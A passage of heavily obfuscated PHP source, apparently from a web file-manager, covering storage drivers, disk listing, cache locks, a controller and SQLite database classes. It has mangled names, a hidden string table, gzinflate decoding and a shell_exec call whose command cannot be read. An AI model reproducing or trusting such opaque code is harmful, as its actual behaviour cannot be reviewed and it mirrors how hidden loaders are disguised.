Model($À˜àœÛƒ[848])->get($³ï§˜è©); if ($»“¢é®) { return $»“¢é®; } if ($æßê°× == $À˜àœÛƒ[191]) { $»“¢é® = self::make(Model($À˜àœÛƒ[902])->systemRootPathAdd($À˜àœÛƒ[605])); } else { $»“¢é® = self::systemPath($À˜àœÛƒ[191]); $Î»¾¿—÷ = self::sourceID($»“¢é®); $»“¢é® = self::make(Model($À˜àœÛƒ[902])->mkdir($Î»¾¿—÷, $æßê°×)); } Model($À˜àœÛƒ[848])->set($³ï§˜è©, $»“¢é®); return $»“¢é®; } public static function systemFolder($œ·âÂÜ­) { $íæ€Ûè¸ = IO_PATH_SYSTEM_SOURCE . $œ·âÂÜ­; $ï±Ü¯º = Cache::get($íæ€Ûè¸); if (!$ï±Ü¯º) { $Šı‹£é = IO::infoFullSimple($íæ€Ûè¸); if (!$Šı‹£é) { $ï±Ü¯º = IO::mkdir($íæ€Ûè¸, REPEAT_SKIP); } else { $ï±Ü¯º = $Šı‹£é[$_SERVER[¿ğÚ‰±–][87]]; } Cache::set($íæ€Ûè¸, $ï±Ü¯º, 3600 * 10); } return $ï±Ü¯º; } public static function defaultDriver() { return Model($_SERVER[¿ğÚ‰±–][845])->defaultDriver(); } public static function defaultIO() { $–«Ğ ¿ =& $_SERVER[¿ğÚ‰±–]; $½Á¤çí¾ = self::defaultDriver(); return $–«Ğ ¿[1388] . $½Á¤çí¾[$–«Ğ ¿[475]] . $–«Ğ ¿[1376]; } public static function defaultDriverInit() { static $å¬Œ÷Í = false; if ($å¬Œ÷Í) { return $å¬Œ÷Í; } $å¬Œ÷Í = IO::init(self::defaultIO()); return $å¬Œ÷Í; } public static function fileTypeList() { $õŒ²µ£œ =& $_SERVER[¿ğÚ‰±–]; $ÀãÅµÉ = $GLOBALS[$õŒ²µ£œ[6]][$õŒ²µ£œ[1389]]; foreach ($ÀãÅµÉ as $Æ¹¹¶À => $à¯Ì£ù¸) { $ú¯ïü¸ö = $õŒ²µ£œ[1390] . $Æ¹¹¶À; $’ÌÅ¬Õû = LNG($ú¯ïü¸ö); if ($ú¯ïü¸ö != $’ÌÅ¬Õû) { $ÀãÅµÉ[$Æ¹¹¶À][$õŒ²µ£œ[32]] = $’ÌÅ¬Õû; } } return $ÀãÅµÉ; } public static function diskList($ÓÅÕĞ³Ì = true) { $Ì‰ï™Şá = $_SERVER[¿ğÚ‰±–][1391]; if ($ÓÅÕĞ³Ì) { $ÍüİÌà = Cache::get($Ì‰ï™Şá); if (is_array($ÍüİÌà)) { return $ÍüİÌà; } } $ÍüİÌà = self::diskListGet(); Cache::set($Ì‰ï™Şá, $ÍüİÌà, 60); return $ÍüİÌà; } public static function diskListGet() { $¸Ç£ùšı =& $_SERVER[¿ğÚ‰±–]; $¶‹åø¤à = array(); if ($GLOBALS[$¸Ç£ùšı[6]][$¸Ç£ùšı[1392]] == $¸Ç£ùšı[1393]) { $¿˜É–î = $¸Ç£ùšı[1394]; for ($Õò¿Óèá = 0; $Õò¿Óèá < strlen($¿˜É–î); $Õò¿Óèá++) { $Ñ™¾³ê½ = $¿˜É–î[$Õò¿Óèá] . $¸Ç£ùšı[1395]; if (file_exists($Ñ™¾³ê½)) { $¶‹åø¤à[] = $Ñ™¾³ê½; } } return $¶‹åø¤à; } if (!function_exists($¸Ç£ùšı[101])) { $¶‹åø¤à[] = $¸Ç£ùšı[913]; return $¶‹åø¤à; } $âÔåª¸ê = explode($¸Ç£ùšı[262], shell_exec($¸Ç£ùšı[1396])); array_shift($âÔåª¸ê); array_pop($âÔåª¸ê); $ªÈÈ‡¨ğ = array($¸Ç£ùšı[1397], $¸Ç£ùšı[1398], $¸Ç£ùšı[1399], $¸Ç£ùšı[1400], $¸Ç£ùšı[1401], $¸Ç£ùšı[1402], $¸Ç£ùšı[1403], $¸Ç£ùšı[1404]); foreach ($âÔåª¸ê as $Å‡ÊæÎ ) { $è¶ĞÃÙ = preg_split($¸Ç£ùšı[1405], $Å‡ÊæÎ ); $Ñ™¾³ê½ = $è¶ĞÃÙ[count($è¶ĞÃÙ) - 1]; if (!strstr($è¶ĞÃÙ[0], $¸Ç£ùšı[1406]) || !$Ñ™¾³ê½) { continue; } $Øêƒ…Ğ = rtrim($Ñ™¾³ê½, $¸Ç£ùšı[8]) . $¸Ç£ùšı[8]; if (in_array($Øêƒ…Ğ, $ªÈÈ‡¨ğ)) { continue; } $¶‹åø¤à[] = $Øêƒ…Ğ; } return $¶‹åø¤à; } public static function isSameDisk($ôúœÌóØ, $ç®‡¼Æ) { $£ï¥Ñûš =& $_SERVER[¿ğÚ‰±–]; if ($GLOBALS[$£ï¥Ñûš[6]][$£ï¥Ñûš[1392]] == $£ï¥Ñûš[1393]) { return strtolower(substr($ôúœÌóØ, 0, 1)) == strtolower(substr($ç®‡¼Æ, 0, 1)); } $ßÖô–´ù = self::diskList(); $§í—Ğ” = !1; $Ò’Æ¾¦ = !1; sort($ßÖô–´ù); $ßÖô–´ù = array_reverse($ßÖô–´ù); $ôúœÌóØ = rtrim($ôúœÌóØ, $£ï¥Ñûš[8]) . $£ï¥Ñûš[8]; $ç®‡¼Æ = rtrim($ç®‡¼Æ, $£ï¥Ñûš[8]) . $£ï¥Ñûš[8]; foreach ($ßÖô–´ù as $ÑÈÉŒ¶) { $®Ú’—“¶ = strlen($ÑÈÉŒ¶); if (!$§í—Ğ” && substr($ôúœÌóØ, 0, $®Ú’—“¶) == $ÑÈÉŒ¶) { $§í—Ğ” = $ÑÈÉŒ¶; } if (!$Ò’Æ¾¦ && substr($ç®‡¼Æ, 0, $®Ú’—“¶) == $ÑÈÉŒ¶) { $Ò’Æ¾¦ = $ÑÈÉŒ¶; } if ($§í—Ğ” && $Ò’Æ¾¦) { break; } } return $§í—Ğ” === $Ò’Æ¾¦; } public static function transferType($†ğØúÎÜ, $ÑÙÎŒ°‹) { $Ä•é¼ø‚ =& $_SERVER[¿ğÚ‰±–]; $Ê«‚üª¥ = self::driverType($†ğØúÎÜ); $ÇúŞĞÏ = self::driverType($ÑÙÎŒ°‹); if ($Ê«‚üª¥[$Ä•é¼ø‚[33]] == $ÇúŞĞÏ[$Ä•é¼ø‚[33]] && $Ê«‚üª¥[$Ä•é¼ø‚[1407]] == $ÇúŞĞÏ[$Ä•é¼ø‚[1407]]) { return $Ä•é¼ø‚[1408]; } if ($Ê«‚üª¥[$Ä•é¼ø‚[33]] == $Ä•é¼ø‚[946] && $ÇúŞĞÏ[$Ä•é¼ø‚[33]] == $Ä•é¼ø‚[109]) { return $Ä•é¼ø‚[1286]; } if ($Ê«‚üª¥[$Ä•é¼ø‚[33]] == $Ä•é¼ø‚[109] && $ÇúŞĞÏ[$Ä•é¼ø‚[33]] == $Ä•é¼ø‚[946]) { return $Ä•é¼ø‚[110]; } return $Ä•é¼ø‚[1409]; } public static function driverType($ ¯ˆ¾Óò) { $…Ë»°½ =& $_SERVER[¿ğÚ‰±–]; $µµêú = str_replace($…Ë»°½[1410], $…Ë»°½[12], strtolower($ ¯ˆ¾Óò->getType())); if ($µµêú == $…Ë»°½[835] || $µµêú == $…Ë»°½[1411] || $µµêú == $…Ë»°½[1412]) { $ ¯ˆ¾Óò = self::defaultDriverInit(); } else { if ($µµêú == $…Ë»°½[1296] || $µµêú == $…Ë»°½[1413]) { $ ¯ˆ¾Óò = IO::init($ ¯ˆ¾Óò->pathParse[$…Ë»°½[1239]]); } } $ÈÓÏ´ÑŠ = $ ¯ˆ¾Óò->path; $µµêú = str_replace($…Ë»°½[1410], $…Ë»°½[12], strtolower($ ¯ˆ¾Óò->getType())); if ($µµêú == $…Ë»°½[109]) { return array($…Ë»°½[33] => $…Ë»°½[109], $…Ë»°½[1407] => $…Ë»°½[12], $…Ë»°½[87] => $ÈÓÏ´ÑŠ, $…Ë»°½[98] => $ ¯ˆ¾Óò); } return array($…Ë»°½[33] => $…Ë»°½[946], $…Ë»°½[1407] => $ ¯ˆ¾Óò->pathDriver, $…Ë»°½[87] => $ÈÓÏ´ÑŠ, $…Ë»°½[98] => $ ¯ˆ¾Óò); } public static function pathDriverType($şˆÓ„¶Ñ) { return $şˆÓ„¶Ñ ? self::driverType(IO::init($şˆÓ„¶Ñ)) : !1; } public static function pathDriverLocal($œÎèïíŸ) { $óŸú„¨ =& $_SERVER[¿ğÚ‰±–]; $¶Ù¶“¥£ = $œÎèïíŸ ? self::driverType(IO::init($œÎèïíŸ)) : !1; return strtolower($¶Ù¶“¥£[$óŸú„¨[33]]) == $óŸú„¨[109] ? !0 : !1; } public static function allowCover($©Õ£×Ïá, $ì·«ôÁó = true) { $ôÛÀä¬˜ =& $_SERVER[¿ğÚ‰±–]; if (is_string($©Õ£×Ïá)) { $©Õ£×Ïá = IO::info($©Õ£×Ïá); } if (!$©Õ£×Ïá || $©Õ£×Ïá[$ôÛÀä¬˜[33]] == $ôÛÀä¬˜[78] || $©Õ£×Ïá[$ôÛÀä¬˜[79]] <= 100) { return !1; } if (isset($©Õ£×Ïá[$ôÛÀä¬˜[1414]]) || !$©Õ£×Ïá[$ôÛÀä¬˜[87]]) { return !1; } if (isset($©Õ£×Ïá[$ôÛÀä¬˜[232]]) && !$©Õ£×Ïá[$ôÛÀä¬˜[232]]) { return !1; } static $ˆòÛ¡ö = false; if (!$ˆòÛ¡ö || !$ì·«ôÁó) { $Ì˜×­É = self::driverType(IO::init($©Õ£×Ïá[$ôÛÀä¬˜[87]])); $­¿çĞùÔ = $Ì˜×­É[$ôÛÀä¬˜[98]]; $ˆòÛ¡ö = $ôÛÀä¬˜[196]; if ($Ì˜×­É[$ôÛÀä¬˜[33]] == $ôÛÀä¬˜[109]) { $ˆòÛ¡ö = $ôÛÀä¬˜[1415]; } if ($Ì˜×­É[$ôÛÀä¬˜[98]] && is_array($Ì˜×­É[$ôÛÀä¬˜[98]]->config)) { $÷­õ•‹Á = $Ì˜×­É[$ôÛÀä¬˜[98]]->config; if (isset($÷­õ•‹Á[$ôÛÀä¬˜[1416]]) && $÷­õ•‹Á[$ôÛÀä¬˜[1416]]) { $ˆòÛ¡ö = $ôÛÀä¬˜[1415]; } } $©Š¸Ç¡ = KodIO::defaultDriver(); if (strtolower($©Š¸Ç¡[$ôÛÀä¬˜[98]]) == $ôÛÀä¬˜[109] && is_array($©Š¸Ç¡[$ôÛÀä¬˜[6]])) { $¨±÷°¢ò = $©Š¸Ç¡[$ôÛÀä¬˜[6]][$ôÛÀä¬˜[1269]]; if (substr($¨±÷°¢ò, 0, 2) == $ôÛÀä¬˜[1417]) { $¨±÷°¢ò = str_replace($ôÛÀä¬˜[1417], BASIC_PATH, $¨±÷°¢ò); } $¨±÷°¢ò = str_replace($ôÛÀä¬˜[592], $ôÛÀä¬˜[8], $¨±÷°¢ò); if (substr($©Õ£×Ïá[$ôÛÀä¬˜[87]], 0, strlen($¨±÷°¢ò)) == $¨±÷°¢ò) { $ˆòÛ¡ö = $ôÛÀä¬˜[196]; } } } return $ˆòÛ¡ö == $ôÛÀä¬˜[1415] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ØÔìîäª) { parent::__construct($ØÔìîäª); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($±ëí¥ã) { $İğÓÜšİ =& $_SERVER[¿ğÚ‰±–]; if (substr($±ëí¥ã, 0, 7) == $İğÓÜšİ[313]) { $±ëí¥ã = $İğÓÜšİ[314] . substr($±ëí¥ã, 7); } header($İğÓÜšİ[175] . $±ëí¥ã); die; } } goto F»šŠò”Œ; F¾èà³¼‰ğ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ë‘¡İòõ =& $_SERVER[¿ğÚ‰±–]; $«ºŸö„¢ = $GLOBALS[$ë‘¡İòõ[6]][$ë‘¡İòõ[425]]; self::$cachePath = $«ºŸö„¢[$ë‘¡İòõ[230]][$ë‘¡İòõ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ÜÄ¹ƒ“‡, $÷ÀØ‰¼ç = 0) { $•ı¹À‹ì =& $_SERVER[¿ğÚ‰±–]; $ÃŒùÄÙ = microtime(!0); $Èíƒ¯¥Ï = $ÃŒùÄÙ + $÷ÀØ‰¼ç + 0.0001; $é°Ñ¡Á— = rtrim(self::$cachePath, $•ı¹À‹ì[8]) . $•ı¹À‹ì[941] . md5($ÜÄ¹ƒ“‡) . $•ı¹À‹ì[938]; if (file_exists($é°Ñ¡Á—) && filemtime($é°Ñ¡Á—) && filemtime($é°Ñ¡Á—) < time() - 10) { @unlink($é°Ñ¡Á—); } do { if (file_exists($é°Ñ¡Á—)) { cacheLockWait(); continue; } $›µôÁ¸ñ = fopen($é°Ñ¡Á—, $•ı¹À‹ì[942]); if (!$›µôÁ¸ñ) { return !1; } $ÒÛı¢òº = flock($›µôÁ¸ñ, LOCK_EX | LOCK_NB); self::$caches[$ÜÄ¹ƒ“‡] = array($•ı¹À‹ì[943] => $›µôÁ¸ñ, $•ı¹À‹ì[230] => $é°Ñ¡Á—); fwrite($›µôÁ¸ñ, $Èíƒ¯¥Ï); clearstatcache(); if ($›µôÁ¸ñ && $ÒÛı¢òº) { return !0; } cacheLockWait(); } while (microtime(!0) < $Èíƒ¯¥Ï); $this->unlock($ÜÄ¹ƒ“‡); return !1; } public function lockGet($ŠÌ™Å‚à) { $ËÍ¿Úá¸ =& $_SERVER[¿ğÚ‰±–]; $èåü²Ç = rtrim(self::$cachePath, $ËÍ¿Úá¸[8]) . $ËÍ¿Úá¸[941] . md5($ŠÌ™Å‚à) . $ËÍ¿Úá¸[938]; return file_exists($èåü²Ç); } public function unlock($Ç½…Ò––) { $äèÜìé™ =& $_SERVER[¿ğÚ‰±–]; $©›´şĞÍ = self::$caches[$Ç½…Ò––]; if (!$©›´şĞÍ) { return; } @flock($©›´şĞÍ[$äèÜìé™[943]], LOCK_UN); @fclose($©›´şĞÍ[$äèÜìé™[943]]); @unlink($©›´şĞÍ[$äèÜìé™[230]]); unset(self::$caches[$Ç½…Ò––]); } } class CacheLockRedis { public function lock($÷ª€ğ…£, $—ÀÜ = 10) { $£Îí­¬ = Cache::init(); $Íõª¸œ = microtime(!0) + $—ÀÜ; while (microtime(!0) < $Íõª¸œ) { $¢ Ç¥Â¶ = $£Îí­¬->get($÷ª€ğ…£); if (!$¢ Ç¥Â¶) { $œ»×ó»› = $£Îí­¬->setLock($÷ª€ğ…£, $Íõª¸œ, $—ÀÜ); if ($œ»×ó»›) { return !0; } } else { if ($¢ Ç¥Â¶ < microtime(!0)) { $£Îí­¬->set($÷ª€ğ…£, $Íõª¸œ, $—ÀÜ * 2); if ($£Îí­¬->get($÷ª€ğ…£) === $¢ Ç¥Â¶) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ñªÖ¹˜‹) { return Cache::init()->get($ñªÖ¹˜‹); } public function unlock($Êƒòá«) { return Cache::init()->remove($Êƒòá«); } } goto FîÑù‡âî; D¹²Šá§‘ñ: if (!$earoxdqtjw) { die; } $_SERVER[‹ÓÅ‘à¹] = explode($_SERVER[¿ğÚ‰±–][680], gzinflate(substr($_SERVER[¿ğÚ‰±–][681], 10, -8))); $vzywsmxgjc = $_SERVER[¿ğÚ‰±–][682]; goto Aª½ÙÇÚê¾; A£è§¼‹¦º: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $˜ÎÎ„Û =& $_SERVER[¿ğÚ‰±–]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$˜ÎÎ„Û[6]] =& $config; $this->values[$˜ÎÎ„Û[7]] =& $in; $this->tpl = TEMPLATE . MOD . $˜ÎÎ„Û[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($†Š±ªä) { if (1 === func_num_args()) { $this->{$†Š±ªä} = new $†Š±ªä(); } else { $’¤š±² = new ReflectionClass($†Š±ªä); $Â…©ä© = func_get_args(); array_shift($Â…©ä©); $this->{$†Š±ªä} = $’¤š±²->newInstanceArgs($Â…©ä©); } return $this->{$†Š±ªä}; } public function routeBind($şù©¦•·, $¾ñ¾Äçì, $ááæ­’æ = 3) { $µòã…Ò =& $_SERVER[¿ğÚ‰±–]; $ŞÖÑØ˜Ú = $this->in[$µòã…Ò[9]]; $şù©¦•· = str_replace($µòã…Ò[10], $µòã…Ò[11], trim(trim($şù©¦•·, $µòã…Ò[8]), $µòã…Ò[12])); if (!$şù©¦•· || count($ŞÖÑØ˜Ú) <= $ááæ­’æ) { return !1; } $Ê˜–Öß€ = !0; $ÑŸ‹şìĞ = explode($µòã…Ò[8], $şù©¦•·); for ($üŞ¼±úÖ = 0; $üŞ¼±úÖ < count($ÑŸ‹şìĞ); $üŞ¼±úÖ++) { if ($ÑŸ‹şìĞ[$üŞ¼±úÖ] != $ŞÖÑØ˜Ú[$ááæ­’æ + $üŞ¼±úÖ]) { $Ê˜–Öß€ = !1; break; } } if (!$Ê˜–Öß€) { return; } call_user_func_array(array($this, $¾ñ¾Äçì), array()); } public function routeArgs($ìÓ’Ğï† = 3) { $ê–œïæ = $this->in[$_SERVER[¿ğÚ‰±–][9]]; if (count($ê–œïæ) <= $ìÓ’Ğï†) { return array(); } $Äøäóœ = array(); for ($üÍáÈ§ = $ìÓ’Ğï†; $üÍáÈ§ < count($ê–œïæ); $üÍáÈ§ += 2) { $Äøäóœ[$ê–œïæ[$üÍáÈ§]] = $ê–œïæ[$üÍáÈ§ + 1]; $this->in[$ê–œïæ[$üÍáÈ§]] = $ê–œïæ[$üÍáÈ§ + 1]; } return $Äøäóœ; } protected function assign($‹¨«òÚ, $²ÁÏ€¥´) { $this->values[$‹¨«òÚ] = $²ÁÏ€¥´; } protected function display($¥¤ù¢ê¬) { ob_end_clean(); extract($this->values); require $this->tpl . $¥¤ù¢ê¬; } } class DbSqliteBase extends Db { public function __construct($ë‰…Û¾ä = '') { $€È¾Ÿİ¢ =& $_SERVER[¿ğÚ‰±–]; if (!extension_loaded($€È¾Ÿİ¢[13])) { think_exception(think_lang($€È¾Ÿİ¢[14]) . $€È¾Ÿİ¢[15]); } if (!empty($ë‰…Û¾ä)) { if (!isset($ë‰…Û¾ä[$€È¾Ÿİ¢[16]])) { $ë‰…Û¾ä[$€È¾Ÿİ¢[16]] = 438; } $this->config = $ë‰…Û¾ä; if (empty($this->config[$€È¾Ÿİ¢[17]])) { $this->config[$€È¾Ÿİ¢[17]] = array(); } } } public function connect($“İ¯£ÄŸ = '', $îøÁÉ× = 0) { $¦‰ÊÎ»Î =& $_SERVER[¿ğÚ‰±–]; if (!isset($this->linkID[$îøÁÉ×])) { if (empty($“İ¯£ÄŸ)) { $“İ¯£ÄŸ = $this->config; } $Õç¿Ûú = !empty($“İ¯£ÄŸ[$¦‰ÊÎ»Î[17]][$¦‰ÊÎ»Î[18]]) ? $“İ¯£ÄŸ[$¦‰ÊÎ»Î[17]][$¦‰ÊÎ»Î[18]] : $this->pconnect; $”ÖŞ„²æ = $Õç¿Ûú ? $¦‰ÊÎ»Î[19] : $¦‰ÊÎ»Î[20]; $this->linkID[$îøÁÉ×] = $”ÖŞ„²æ($“İ¯£ÄŸ[$¦‰ÊÎ»Î[21]], $“İ¯£ÄŸ[$¦‰ÊÎ»Î[16]]); if (!$this->linkID[$îøÁÉ×]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$îøÁÉ×], 30000); if (1 != think_config($¦‰ÊÎ»Î[22])) { unset($this->config); } } return $this->linkID[$îøÁÉ×]; } public function free() { $this->queryID = null; } public function query($ Ì¿˜Ù) { $±÷ÓõİÄ =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ Ì¿˜Ù; if ($this->queryID) { $this->free(); } think_action_status($±÷ÓõİÄ[23], 1); think_status($±÷ÓõİÄ[24]); $this->queryID = sqlite_query($this->_linkID, $ Ì¿˜Ù); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ˆ«‚Ôç¾ = $this->getAll(); return $ˆ«‚Ôç¾; } } public function execute($âü”šÇ¤) { $Î†¤Ú½¸ =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $âü”šÇ¤; if ($this->queryID) { $this->free(); } think_action_status($Î†¤Ú½¸[25], 1); think_status($Î†¤Ú½¸[24]); $º±¤†¦ù = sqlite_exec($this->_linkID, $âü”šÇ¤); $this->debug(); if (!1 === $º±¤†¦ù) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¿ğÚ‰±–][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Œ±«Ÿ’¥ = sqlite_query($this->_linkID, $_SERVER[¿ğÚ‰±–][27]); if (!$Œ±«Ÿ’¥) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¤§ıûïÙ = sqlite_query($this->_linkID, $_SERVER[¿ğÚ‰±–][28]); if (!$¤§ıûïÙ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ğßƒŸ¡¼ = array(); if ($this->numRows > 0) { for ($… Á¸¿ä = 0; $… Á¸¿ä < $this->numRows; $… Á¸¿ä++) { $ğßƒŸ¡¼[$… Á¸¿ä] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ğßƒŸ¡¼; } public function getFields($Ï÷Ú¤¨¾) { $ŸíŸÌ©æ =& $_SERVER[¿ğÚ‰±–]; $Ûïíø¬ = $this->query($ŸíŸÌ©æ[29] . $Ï÷Ú¤¨¾ . $ŸíŸÌ©æ[30]); $®ê’ò£ç = array(); if ($Ûïíø¬) { foreach ($Ûïíø¬ as $Á¯âï°´ => $óâˆ“») { $®ê’ò£ç[$óâˆ“»[$ŸíŸÌ©æ[31]]] = array($ŸíŸÌ©æ[32] => $óâˆ“»[$ŸíŸÌ©æ[31]], $ŸíŸÌ©æ[33] => $óâˆ“»[$ŸíŸÌ©æ[34]], $ŸíŸÌ©æ[35] => (bool) ($óâˆ“»[$ŸíŸÌ©æ[36]] === $ŸíŸÌ©æ[12]), $ŸíŸÌ©æ[37] => $óâˆ“»[$ŸíŸÌ©æ[38]], $ŸíŸÌ©æ[39] => strtolower($óâˆ“»[$ŸíŸÌ©æ[40]]) == $ŸíŸÌ©æ[41], $ŸíŸÌ©æ[42] => strtolower($óâˆ“»[$ŸíŸÌ©æ[43]]) == $ŸíŸÌ©æ[44]); } } return $®ê’ò£ç; } public function getTables($åÊä†‡É = '') { $®”¡»®Š =& $_SERVER[¿ğÚ‰±–]; $·Õı¬À = $this->query($®”¡»®Š[45] . $®”¡»®Š[46] . $®”¡»®Š[47]); $ÙäÒ†ñÉ = array(); foreach ($·Õı¬À as $ã°ÙØşó => $öšâ‰˜) { $ÙäÒ†ñÉ[$ã°ÙØşó] = current($öšâ‰˜); } return $ÙäÒ†ñÉ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $›ÎÉÕôŠ =& $_SERVER[¿ğÚ‰±–]; $•¢ÄÉÏË = sqlite_last_error($this->_linkID); $this->error = $•¢ÄÉÏË . $›ÎÉÕôŠ[4] . sqlite_error_string($•¢ÄÉÏË); if ($›ÎÉÕôŠ[12] != $this->queryStr) { $this->error .= LNG($›ÎÉÕôŠ[48]) . $this->queryStr; } think_trace($this->error, $›ÎÉÕôŠ[12], $›ÎÉÕôŠ[49]); return $this->error; } public function escapeString($– ´ßÛ†) { return sqlite_escape_string($– ´ßÛ†); } public function parseLimit($§Ì¬ğ¤³) { $ıù³ôè =& $_SERVER[¿ğÚ‰±–]; $’à‰”¤æ = $ıù³ôè[12]; if (!empty($§Ì¬ğ¤³)) { $§Ì¬ğ¤³ = explode($ıù³ôè[50], $§Ì¬ğ¤³); if (count($§Ì¬ğ¤³) > 1) { $’à‰”¤æ .= $ıù³ôè[51] . $§Ì¬ğ¤³[1] . $ıù³ôè[52] . $§Ì¬ğ¤³[0] . $ıù³ôè[53]; } else { $’à‰”¤æ .= $ıù³ôè[51] . $§Ì¬ğ¤³[0] . $ıù³ôè[53]; } } return $’à‰”¤æ; } } class DbSqlite3Base extends Db { public function __construct($Å³ÅáŒÁ = '') { $„éªêµ =& $_SERVER[¿ğÚ‰±–]; if (!class_exists($„éªêµ[54])) { think_exception(think_lang($„éªêµ[14]) . $„éªêµ[55]); } if (!empty($Å³ÅáŒÁ)) { if (!isset($Å³ÅáŒÁ[$„éªêµ[16]])) { $Å³ÅáŒÁ[$„éªêµ[16]] = 438; } $this->config = $Å³ÅáŒÁ; if (empty($this->config[$„éªêµ[17]])) { $this->config[$„éªêµ[17]] = array(); } } } public function connect($»íØ—õ = '', $êâƒô’ = 0) { $¨îÃ¹«µ =& $_SERVER[¿ğÚ‰±–]; if (!isset($this->linkID[$êâƒô’])) { if (empty($»íØ—õ)) { $»íØ—õ = $this->config; } $this->linkID[$êâƒô’] = new SQLite3($»íØ—õ[$¨îÃ¹«µ[21]]); if (!$this->linkID[$êâƒô’]) { think_exception($this->linkID[$êâƒô’]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$êâƒô’]->busyTimeout(30000); if (1 != think_config($¨îÃ¹«µ[22])) { unset($this->config); } } return $this->linkID[$êâƒô’]; } public function free() { $this->queryID = null; } public function query($»íà•º) { $³¾ß°üø =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»íà•º; if ($this->queryID) { $this->free(); } think_action_status($³¾ß°üø[23], 1); think_status($³¾ß°üø[24]); $this->queryID = $this->_linkID->query($»íà•º); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $•ÍâùÈÅ = $this->getAll(); $this->numRows = count($•ÍâùÈÅ); return $•ÍâùÈÅ; } } public function execute($²‹Î¦í) { $±ÕšÚãÏ =& $_SERVER[¿ğÚ‰±–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $²‹Î¦í; if ($this->queryID) { $this->free(); } think_action_status($±ÕšÚãÏ[25], 1); think_status($±ÕšÚãÏ[24]); $î›ÆùÉ¡ = $this->_linkID->exec($²‹Î¦í); $this->debug(); if (!1 === $î›ÆùÉ¡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¿ğÚ‰±–][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˜š’Äóõ = $this->_linkID->query($_SERVER[¿ğÚ‰±–][27]); if (!$˜š’Äóõ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $È…®Ô¼² = $this->_linkID->query($_SERVER[¿ğÚ‰±–][28]); if (!$È…®Ô¼²) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Í¯ÚôÖ† = array(); while ($–ÏÍÏ‰ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Í¯ÚôÖ†[] = $–ÏÍÏ‰; } $this->queryID->reset(); return $Í¯ÚôÖ†; } public function getFields($¾½Î»£†) { $³éä»ƒ =& $_SERVER[¿ğÚ‰±–]; $£”‘Æ—Å = $this->query($³éä»ƒ[29] . $¾½Î»£† . $³éä»ƒ[30]); $éİÉ«Öî = array(); if ($£”‘Æ—Å) { foreach ($£”‘Æ—Å as $€ó×ü“ => $©Ò»ÉúÈ) { $éİÉ«Öî[$©Ò»ÉúÈ[$³éä»ƒ[32]]] = array($³éä»ƒ[32] => $©Ò»ÉúÈ[$³éä»ƒ[32]], $³éä»ƒ[33] => $©Ò»ÉúÈ[$³éä»ƒ[33]], $³éä»ƒ[35] => (bool) ($©Ò»ÉúÈ[$³éä»ƒ[35]] === $³éä»ƒ[12]), $³éä»ƒ[37] => $©Ò»ÉúÈ[$³éä»ƒ[56]], $³éä»ƒ[39] => (bool) $©Ò»ÉúÈ[$³éä»ƒ[57]], $³éä»ƒ[42] => (bool) $©Ò»ÉúÈ[$³éä»ƒ[57]]); } } return $éİÉ«Öî; } public function getTables($“©ˆ¨¥· = '') { $Ö£ÊáÁµ =& $_SERVER[¿ğÚ‰±–]; $Å›êá» = $this->query($Ö£ÊáÁµ[45] . $Ö£ÊáÁµ[46] . $Ö£ÊáÁµ[47]); $†‹³äÅº = array(); foreach ($Å›êá» as $ °äıÍ => $·äÁ«¾Á) { $†‹³äÅº[$ °äıÍ] = current($·äÁ«¾Á); } return $†‹³äÅº; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¥ƒªíç =& $_SERVER[¿ğÚ‰±–]; $this->error = $this->_linkID->lastErrorMsg(); if ($¥ƒªíç[12] != $this->queryStr) { $this->error .= LNG($¥ƒªíç[48]) . $this->queryStr; } think_trace($this->error, $¥ƒªíç[12], $¥ƒªíç[49]); return $this->error; } public function escapeString($ÜÉñå‰Û) { $¨©ıúå‘ =& $_SERVER[¿ğÚ‰±–]; if ($this->_linkID) { return $this->_linkID->escapeString($ÜÉñå‰Û); } return str_ireplace($¨©ıúå‘[58], $¨©ıúå‘[59], $ÜÉñå‰Û); } public function parseLimit($îíÄ Ù·) { 